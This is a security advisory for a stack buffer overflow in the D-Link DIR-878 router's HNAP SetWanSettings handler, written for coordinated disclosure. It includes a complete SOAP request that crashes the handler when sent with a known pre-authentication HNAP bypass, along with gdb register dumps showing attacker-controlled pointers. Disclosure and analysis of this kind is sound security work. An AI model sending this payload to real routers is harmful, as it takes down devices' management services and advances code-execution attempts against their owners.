# D-Link DIR-878 SetWanSettings (wan0) L2TP/PPTP ConfigDNS Stack-based Buffer Overflow (No Validation)

> **Status:** CVE: Not assigned (identifier requested). Vendor notification: pending. Repository published for coordinated disclosure.

## Summary

A stack-based buffer overflow vulnerability was discovered in D-Link DIR-878 (REV A) firmware
v1.20B05. In the `SetWanSettings` HNAP handler (default `WANID` = wan0), the **L2TP** and **PPTP**
branches copy the user-controlled `ConfigDNS/Primary` and `ConfigDNS/Secondary` fields into a
**72-byte stack buffer** via `strncat(buf, src, strlen(src))` — which is exactly equivalent to an
unbounded `strcat` — inside helper function `FUN_00464134`. Unlike the Static/DHCP branches
(advisory 02), this path performs **no IP-format validation at any point**. Disassembly confirms
the saved return address sits immediately after the buffer (offset 72), so a `Primary` of 73+
bytes begins overwriting it; a 100-byte `Primary` crashes the process. The handler is reachable
pre-authentication via the previously disclosed HNAP bypass (CVE-2020-15633 class, verified on
v1.20B05).

## Affected Product

- Vendor: D-Link
- Product: DIR-878, Hardware Revision A
- Firmware: v1.20B05 (verified). The product is EoL/EoS; later v1.30B08 hotfix builds share the
  same HNAP codebase lineage but were not individually re-verified.

## Vulnerability Details

- Type: Stack-based Buffer Overflow — CWE-121
- Component: `bin/prog.cgi`
- Sink function: `FUN_00464134` (L2TP/PPTP branch helper); dispatch in `FUN_00464680`

### Root Cause

```c
char buf[72];                              /* auStack_4c */
strncat(buf, Primary,   strlen(Primary));  /* == strcat: completely unbounded */
strncat(buf, Secondary, strlen(Secondary));
```

Both copies happen at the top of the helper, **before any field validation and before any branch
decision**, so `Primary`/`Secondary` need not be valid IP addresses. Frame geometry from
disassembly: saved `ra` at buffer offset 72.

### Distinction from advisory 02 and known CVEs

The DNS-concatenation overflow pattern is instantiated per WAN interface × branch. This advisory
covers **wan0's L2TP/PPTP branch** (`FUN_00464134`, 72-byte buffer, no validation at all),
distinct from advisory 02's Static/DHCP helpers (`FUN_00462aa0`/`FUN_0046342c`, 64-byte buffer,
copy precedes validation), distinct from CVE-2026-90693 (wan3 Static, `FUN_00463148`), and
distinct from the CVE-2022-4656x family (`Password` fields of `SetWanSettings2/3` on 1.30B08).

## Proof of Concept (non-destructive)

Control (`Primary=1.1.1.1`, `Secondary=2.2.2.2`, Type=L2TP) → HTTP 200
`SetWanSettingsResult>OK`, process alive.

Attack (`Primary` = 100 × "A"):

```xml
<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><SetWanSettings xmlns="http://purenetworks.com/HNAP1/"><Type>L2TP</Type><ConfigDNS><Primary>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</Primary><Secondary>2.2.2.2</Secondary></ConfigDNS><MTU>1400</MTU><Username>user</Username><Password>pass123</Password><AutoReconnect>false</AutoReconnect><MaxIdleTime>0</MaxIdleTime><IPAddress>10.0.0.2</IPAddress><SubnetMask>255.255.255.0</SubnetMask><Gateway>10.0.0.1</Gateway><ServiceName>svc</ServiceName><MacAddress>00:11:22:33:44:55</MacAddress></SetWanSettings></soap:Body></soap:Envelope>
```

Send with the HNAP bypass header (`POST /HNAP1/?GetCAPTCHAsetting`,
`SOAPAction: "...SetWanSettings"`). Observed: HTTP 500, FastCGI worker death + core dump. The
PPTP branch crashes identically (100 × "C"). The `Password` value need not be valid
(`decrypt_aes` failure does not block the flow — the lighttpd-side log even records the failing
`dcipher_aes.c:220: input length error` during the attack).

### gdb register forensics (two independent captures)

Capture 1 (L2TP, Primary = "A"×100):

```
SIGSEGV, pc = 0x2bca61dc → uClibc strlen+0x1c (base 0x2bc70000)
v1 = a0 = a1 = s1 = s2 = 0x41414141   ← attacker bytes form the dereferenced pointer
```

Mechanism: 100 bytes overwrite `ra` (offset 72–75) and turn the param_6 stack slot (offset 96)
into `0x41414141` → `nvram_safe_set("wan_wan0_vpn_username", 0x41414141)` → strlen on a wild
pointer.

Capture 2 (L2TP, Primary = "A"×80):

```
pc = 0x2bca61dc (strlen+0x1c)
v1 = a0 = a1 = s1 = s2 = 0x322e322e   ← bytes of Secondary "2.2.2.2" ('.2.2')
```

Mechanism: 80 bytes overwrite `ra` and reroute the function into the Static branch →
`FUN_00462920(0x322e322e, …)` → `tbsCheckIp` → strlen on a wild pointer.

Both captures independently show attacker bytes entering pointer-level dereferences in 4-byte
granularity; the crash sites are inside `strlen` (not at `jr ra`), so PC control is plausible but
**not** demonstrated and not claimed.

**Cleanup:** crash cases leave no persistent change; the FastCGI worker is restarted
automatically. The non-crashing control case writes `wan_wan0_dns` — restore via web UI if
needed.

## Impact

- Attacker profile: unauthenticated (via the known HNAP bypass), adjacent network.
- Proven impact: pre-authentication crash of the web management handler (denial of service),
  repeatable, both L2TP and PPTP branches.
- Register-level evidence (attacker bytes as dereferenced pointers, `ra` overwrite at offset 72)
  indicates a realistic code-execution ceiling; a full exploit chain was not developed.

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5** (Medium)

Scored on the proven pre-authentication crash; the documented pointer-level control suggests a
higher exploitation ceiling.

## Discovery

Discovered by Zimo-666 on 2026-10-12 via static reverse engineering (disassembly frame geometry)
plus dynamic differential testing with two gdb register captures in a qemu-user rehosting
environment.
Vendor notified: pending.

---

## Repository files

| File | Content |
|---|---|
| `README.md` | This advisory |
| `poc.sh` | Non-destructive reproduction script, derived from the request recorded above |

> The script reproduces the HTTP request documented in this advisory. It is not a substitute for
> the recorded test evidence; the observed outputs quoted above are the evidence.
